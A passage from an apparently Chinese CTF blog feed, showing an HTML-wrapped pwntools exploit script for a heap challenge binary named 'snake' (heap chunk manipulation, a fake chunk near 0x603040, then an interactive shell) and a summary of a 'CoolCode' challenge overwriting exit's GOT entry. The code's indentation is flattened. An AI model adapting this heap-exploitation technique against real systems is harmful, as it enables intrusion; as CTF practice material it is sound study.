class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">from time import *</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; b&quot;CRITICAL&quot;</span><br><span class="line">remote_ip        &#x3D; b&#39;127.0.0.1&#39;</span><br><span class="line">remote_port      &#x3D; 9999</span><br><span class="line">binary_file      &#x3D; &#39;.&#x2F;%s&#39; % &quot;snake&quot;</span><br><span class="line">local_libc_file  &#x3D; b&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;</span><br><span class="line">remote_libc_file &#x3D; b&#39;&#39;</span><br><span class="line">def exploit(sh,remote &#x3D; False,awd &#x3D; False,awd_binary_file &#x3D; &#39;&#39;):</span><br><span class="line">        def debug(gdb_script &#x3D; &quot;&quot;):</span><br><span class="line">                gdb.attach(sh,gdb_script)</span><br><span class="line">        global binary_file,local_libc_file,remote_ip,remote_port,local_libc_file,remote_libc_file</span><br><span class="line">        elf &#x3D; context.binary</span><br><span class="line">        if (awd or remote) and remote_libc_file !&#x3D; &quot;&quot;:</span><br><span class="line">                lib &#x3D; ELF(remote_libc_file)</span><br><span class="line">        else:</span><br><span class="line">                lib &#x3D; elf.libc if local_libc_file &#x3D;&#x3D; b&quot;&quot; else ELF(local_libc_file)</span><br><span class="line">        if context.arch &#x3D;&#x3D; b&quot;amd64&quot;:</span><br><span class="line">                pop_rdi_ret &#x3D; elf.search(asm(b&quot;pop rdi ; ret&quot;)).next()</span><br><span class="line">                pop_rsi_r15_ret &#x3D; elf.search(asm(b&quot;pop rsi ; pop r15 ; ret&quot;)).next()</span><br><span class="line">        s       &#x3D; lambda data               :sh.send(str(data))</span><br><span class="line">        sa      &#x3D; lambda delim,data         :sh.sendafter(str(delim), str(data))</span><br><span class="line">        sl      &#x3D; lambda data               :sh.sendline(str(data))</span><br><span class="line">        sla     &#x3D; lambda delim,data         :sh.sendlineafter(str(delim), str(data))</span><br><span class="line">        r       &#x3D; lambda numb&#x3D;4096          :sh.recv(numb)</span><br><span class="line">        ru      &#x3D; lambda delims, drop&#x3D;True  :sh.recvuntil(delims, drop)</span><br><span class="line">        irt     &#x3D; lambda                    :sh.interactive()</span><br><span class="line">        uu32    &#x3D; lambda data               :u32(data.ljust(4, b&#39;\x00&#39;))</span><br><span class="line">        uu64    &#x3D; lambda data               :u64(data.ljust(8, b&#39;\x00&#39;))</span><br><span class="line">        ru7f    &#x3D; lambda                    :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))</span><br><span class="line">        ruf7    &#x3D; lambda                    :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))</span><br><span class="line">        lg      &#x3D; lambda data               :log.success(data)</span><br><span class="line">def add(idx,size,content):</span><br><span class="line">sla(&quot;4.start name&quot;,&quot;1&quot;)</span><br><span class="line">sla(&quot;?&quot;,str(idx))</span><br><span class="line">sla(&quot;?&quot;,str(size))</span><br><span class="line">sa(&quot;?&quot;,content)</span><br><span class="line">def show(idx):</span><br><span class="line">sla(&quot;4.start name&quot;,&quot;3&quot;)</span><br><span class="line">sla(&quot;?&quot;,str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">sla(&quot;4.start name&quot;,&quot;2&quot;)</span><br><span class="line">sla(&quot;?&quot;,str(idx))</span><br><span class="line">def start():</span><br><span class="line">sla(&quot;4.start name&quot;,&quot;4&quot;)</span><br><span class="line">sla(&quot;how long?&quot;,str(0x68))</span><br><span class="line">sla(&quot;input name&quot;,&#39;jly niubi&#39;)</span><br><span class="line">sla(&quot;enter&quot;,&quot;\n&quot; * (0x20 + 3))</span><br><span class="line">payload &#x3D; p64(0xdeadbeefdeadbeef) * 9</span><br><span class="line">payload +&#x3D; p32(0xcafecafe) + chr(0x70 + 0x40 + 1)</span><br><span class="line">sa(&quot;please leave words&quot;,payload)</span><br><span class="line">sa(&quot;if you want to exit?&quot;,&#39;N&#39;)</span><br><span class="line">add(1,0x38,p64(0xcafecafecafecafe))</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">add(2,0x28,p64(0x2222222222222222))</span><br><span class="line">add(3,0x28,p64(0x3333333333333333))</span><br><span class="line">payload &#x3D; p64(0xcafecafecafecafe) + p64(0x41)</span><br><span class="line">payload +&#x3D; p64(0x603040 + 2)</span><br><span class="line">add(4,0x58,payload)</span><br><span class="line">add(5,0x38,p64(0x5555555555555555))</span><br><span class="line">payload &#x3D; &#39;\x66&#39; * 6</span><br><span class="line">payload +&#x3D; p64(0x0000000000400a06) + &#39;\xb0\x02&#39;</span><br><span class="line">add(6,0x38,payload)</span><br><span class="line">sla(&quot;4.start name&quot;,&quot;1&quot;)</span><br><span class="line">sla(&quot;?&quot;,str(7))</span><br><span class="line">sla(&quot;?&quot;,str(0x68))</span><br><span class="line">        irt()</span><br><span class="line">def CTF_exploit(argv):</span><br><span class="line">        global remote_ip,remote_port,binary_file</span><br><span class="line">        argv_len &#x3D; len(argv)</span><br><span class="line">        context.log_level &#x3D; b&quot;DEBUG&quot;</span><br><span class="line">        context.binary &#x3D; binary_file</span><br><span class="line">        if argv_len &#x3D;&#x3D; 1:</span><br><span class="line">                sh &#x3D; process(binary_file)</span><br><span class="line">                exploit(sh)</span><br><span class="line">                return</span><br><span class="line">        elif argv_len &#x3D;&#x3D; 3:</span><br><span class="line">                sh &#x3D; remote(argv[1],argv[2])</span><br><span class="line">                exploit(sh,remote &#x3D; True)</span><br><span class="line">                return</span><br><span class="line">        else:</span><br><span class="line">                sh &#x3D; process(binary_file)</span><br><span class="line">                exploit(sh)</span><br><span class="line">if __name__ &#x3D;&#x3D; b&quot;__main__&quot;:</span><br><span class="line">        CTF_exploit(sys.argv)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;PWN&lt;/h1&gt;
&lt;h2 id=&quot;CoolCode&quot;&gt;CoolCode&lt;/h2&gt;
&lt;h3 id=&quot;由于add的时候存在负整数溢出，可以直接覆盖exit-got为heap地址，且heap区段是可读可写可执行，所以输入-xc3，也就是ret汇编的机器码，就可以绕过exit&quot;&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
</feed>
